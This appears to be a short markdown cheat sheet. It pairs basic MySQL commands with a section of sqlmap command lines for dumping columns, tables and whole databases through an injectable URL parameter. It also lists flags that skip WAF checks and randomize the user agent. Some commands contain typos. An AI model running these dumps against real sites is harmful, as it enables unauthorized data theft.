
						<h1>SQL</h1>


<h3>Basic Commands Mysql</h3>
`create database d1;		          `	**TO CREATE DATABASE
`show database; 			  `		**TO SHOW ALL DATABASES
`use database-name;                       `    		**TO USE DATABASE
`drop database d1;		       	  `		**TO DELETE DATABASE
`create table t1(name char(20), age int );`		**TO CREATE TABLE WHERE name, age IS COLUMN RESPECTED DATA TYPE char, int 
`insert t1 values("name",20);             ` 	  	**TO INSERT VALUES INTO TABLE 
`show tables;			       	  `		**TO SHOW TABLES	
`delete from t1;                          `             **TO DELETE ALL STORED DATA IN TABLE
`drop table  t1, t2;                      `	        **TO DELETE TABLE
`alter table t1 add Column-Name char(20); `		**TO ADD NEW COLUMN IN TABLE
`alter table t1 drop Column-Name;         `		**TO DELETE COLUMN IN TABLE


<h3>Advance Commmands Mysql</h3>
`set password for user@localhost=password('password');` **TO SET OR RESET PASSWORD
`commit;`						**TO MAKE CHANGES PUBLICLY OF DATABASE'S DATA
`update t1 SET name='test' where age=20;              ` **TO CHANGE DATA IN COLUMN

**Some Operation Mysql**
* Union - Operation to fetch common output between two queries. but the number of columns and the data type of column's must be same to the both side of UNION
  `select name,age from t1 union select nickname, id from t2;`





					<h1>SQL Injection</h1>


<h5>SQLmap Usage</h5>

**TO FETCH ONLY COLUMN'S DATA
`sqlmap - u "url?prm=" -p prm -D dbname -T table_name -C column_name --dump` 

**TO FETCH ONLY ALL COLUMN & ITS DATA
`sqlmap - u "url?prm=" -p prm -D dbname -T table_name  --dump`

**TO FETCH ENTIRE DATABASE'S DATA 		     
`sqlmap - u "url?prm=" -p prm -D dbname  --dump`

**TO FETCH ALL DATABASES
`sqlmap - u "url?prm=" -p prm --dbs  --dump` 
or use --dump-all instead of --dump to fetch all databases's all tables and columns  


<h5>Extra Parameter to Optimise SQLmap's Performance</h5>
* Parameters    **--method GET,   --code 200, --skip-waf, --random-agent, --threads 10 -o **
* Optimised Url **sqlmap -u "url?prm=" -p prm -D dbname -T table_name -C column_name --dump --method GET --code 200 --skip-waf --random-agent --threads 10 -o**

